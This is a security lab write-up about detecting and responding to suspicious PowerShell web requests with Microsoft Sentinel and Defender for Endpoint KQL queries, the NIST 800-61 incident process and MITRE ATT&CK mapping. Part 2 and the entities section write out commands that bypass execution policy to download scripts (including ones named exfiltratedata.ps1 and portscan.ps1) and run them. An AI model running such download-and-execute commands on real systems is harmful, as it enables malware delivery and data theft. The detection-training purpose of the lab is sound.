# PowerShell Suspicious Web Request

<img width="985" height="678" alt="image" src="https://github.com/user-attachments/assets/eb45717d-be9a-42a7-b7e7-d99143913e83" />

This lab demonstrates how to detect and respond to suspicious PowerShell web requests in Microsoft Sentinel by monitoring logs from Microsoft Defender for Endpoint. It walks through creating detection rules, triggering alerts, investigating incidents, and applying MITRE ATT&CK mappings.

---

## 📌 Summary

Sometimes when a bad actor has access to a system, they will attempt to download malicious payloads or tools directly from the internet to expand their control or establish persistence. This is often achieved using legitimate system utilities like PowerShell to blend in with normal activity. By leveraging commands such as Invoke-WebRequest, they can download files or scripts from an external server and immediately execute them, bypassing traditional defenses or detection mechanisms. This tactic is a hallmark of post-exploitation activity, enabling them to deploy malware, exfiltrate data, or establish communication channels with a command-and-control (C2) server. Detecting this behavior is critical to identifying and disrupting an ongoing attack.

When processes are executed/run on the local VM, logs will be forwarded to Microsoft Defender for Endpoint under the DeviceProcessEvents table. These logs are then forwarded to the Log Analytics Workspace being used by Microsoft Sentinel, our SIEM. Within Sentinel, we will define an alert to trigger when PowerShell is used to download a remote file from the internet. 

## 🔍 Part 1: Create Alert Rule (PowerShell Suspicious Web Request)

Design a Sentinel Scheduled Query Rule within Log Analytics that will discover when PowerShell is detected using Invoke-WebRequest to download content. (ensure the appropriate logs show up before creating the alert rule)


**KQL Query:**
```kql

let TargetDevice = "shawn-mde-test";
DeviceProcessEvents
| where DeviceName == TargetDevice
| where FileName == "powershell.exe"
| where ProcessCommandLine contains "Invoke-WebRequest"

```

**Results:**

<img width="1874" height="760" alt="image" src="https://github.com/user-attachments/assets/d8934943-f2bd-404d-a415-711bbf7ebf59" />


</br></br>
Found a command that bypasses execution restrictions and downloads a script from the internet—a common tactic in malware or penetration testing. This command:

- Opens a command prompt.</br>
- Runs PowerShell with relaxed security.</br>
- Downloads a PowerShell script from a GitHub URL.</br>
- Saves it to C:\ProgramData\eicar.ps1.</br>


Once your query is good, create the **Schedule Query Rule in: Sentinel → Analytics → Schedule Query Rule**


<img width="1073" height="1127" alt="image" src="https://github.com/user-attachments/assets/fe0ebeab-941f-4407-b815-27d59dca8e2f" />


## 🛠️ Part 2: Trigger Alert to Create Incident

Note: If your VM is onboarded to MDE and has been running for several hours, the attack simulator will have done the actions necessary to create the logs. If not, you can paste the following into PowerShell on your VM to create the necessary logs:

```
powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/eicar.ps1' -OutFile 'C:\programdata\eicar.ps1';
powershell.exe -ExecutionPolicy Bypass -File 'C:\programdata\eicar.ps1';

```


Don’t get confused between the **[Configuration → Analytics] and [Threat Management → Incidents]** sections.

## 🔐 Part 3: Work Incident

Work your incident to completion and close it out, in accordance with the NIST 800-61: Incident Response Lifecycle

**Preparation**

- Document roles, responsibilities, and procedures.
- Ensure tools, systems, and training are in place.

**Detection and Analysis**

- Identify and validate the incident.
- Observe the incident and assign it to yourself, set the status to Active.

<img width="2217" height="1239" alt="image" src="https://github.com/user-attachments/assets/173b99b4-bf96-47ab-85c3-71b7a07dfe43" />

<br/><br/>
- Investigate the Incident by Actions → Investigate (sometimes takes time for entities to appear)
<br/><br/>
<img width="1680" height="1088" alt="image" src="https://github.com/user-attachments/assets/70ceaee1-8184-4fbb-8fc7-2560126af7fa" />


**Gather relevant evidence and assess impact**<br/><br/>
- The script files are evidence, but the real threat is why and how they were downloaded/executed.

- In real life, this could happen from free software, cracked games, or malicious downloads.

(For the lab: pretend we contacted the user—they admitted installing free software at the same time.)
<br/><br/>

**Observe the different entity mappings and take notes:**<br/><br/>
- The Shawn - PowerShell Suspicious Web Request incident was triggered on 1 Device by 1 different user, but downloaded 2 different scripts with 2 different commands.
<br/><br/>
```
Entities (3)
 powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/exfiltratedata.ps1 -OutFile C:\programdata\exfiltratedata.ps1
 powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/portscan.ps1 -OutFile C:\programdata\portscan.ps1
 shawn-mde-test
```
<br/><br/>
<img width="2534" height="903" alt="image" src="https://github.com/user-attachments/assets/a1f3e35e-44bc-4407-b904-b3811f930e47" />

- After investigating with Defender for Endpoint, it was determined that the downloaded scripts actually did run. See the following query.

**KQL Query**

```
let TargetHostname = "shawn-mde-test"; // Replace with the name of your VM as it shows up in the logs
let ScriptNames = dynamic(["eicar.ps1", "exfiltratedata.ps1", "portscan.ps1", "pwncrypt.ps1"]); // Add the name of the scripts that were downloaded
DeviceProcessEvents
| where DeviceName == TargetHostname // Comment this line out for MORE results
| where FileName == "powershell.exe"
| where ProcessCommandLine contains "-File" and ProcessCommandLine has_any (ScriptNames)
| order by TimeGenerated
| project TimeGenerated, AccountName, DeviceName, FileName, ProcessCommandLine

```

**KQL Query Result**

<img width="1394" height="467" alt="image" src="https://github.com/user-attachments/assets/4bb3c1c0-624b-4ca9-8279-38179a808bd5" />

### 📄Containment, Eradication, and Recovery

- Isolate affected systems with Microsoft Defender for Endpoint.

- Run antimalware scans on the isolated machine.

- Remove malicious files and restore systems.

- Research each executed script and record findings.

<img width="2554" height="910" alt="image" src="https://github.com/user-attachments/assets/719aa313-3c2c-4178-81e6-b67eccbb09ab" />


## 🔗 MITRE ATT&CK Mapping

```
+---------------------------+-----------+----------------------------------------------------------+
| Technique                 | ID        | Description                                              |
+---------------------------+-----------+----------------------------------------------------------+
| Command and Scripting     | T1059.001 | PowerShell used to execute malicious commands            |
| Interpreter: PowerShell   |           |                                                          |
+---------------------------+-----------+----------------------------------------------------------+
| Ingress Tool Transfer     | T1105     | Downloading scripts/payloads from external sources       |
+---------------------------+-----------+----------------------------------------------------------+
| Impair Defenses           | T1562.001 | Using '-ExecutionPolicy Bypass' to evade restrictions    |
+---------------------------+-----------+----------------------------------------------------------+
| Obfuscated Files/Info     | T1027     | Bypass and script delivery often paired with obfuscation |
+---------------------------+-----------+----------------------------------------------------------+

```

## 📘 Lessons Learned

- Living-off-the-Land Attacks Are Common: Attackers abuse trusted tools like PowerShell to bypass defenses.

- Detection Requires Context: Commands with both Invoke-WebRequest and ExecutionPolicy Bypass are highly suspicious.

- SIEM & EDR Integration Is Key: Sentinel + MDE provided visibility into process and script execution.

- Incident Response Practice Matters: Following NIST 800-61 ensured structured handling from detection to recovery.

## 📄 Notes and Recommendations

<img width="2233" height="856" alt="image" src="https://github.com/user-attachments/assets/c36aac9a-9ea6-4c3d-9ac8-347fcf018c15" />


🔒 Restrict PowerShell Usage: Use Just Enough Administration (JEA) and restrict older PowerShell versions.

👀 Enhance Detection Rules: Expand queries to catch -EncodedCommand, IEX, and other suspicious flags.

🧑‍💻 User Awareness: Train users not to download or run unverified scripts.

🛑 Policy Hardening: Apply application control (WDAC, AppLocker) to block scripts from non-standard dirs like C:\ProgramData.

🔁 Post-Incident Improvements: Continuously validate and tune detection rules against MITRE ATT&CK and current threat intel.

✅ Incident closed as a True Positive.

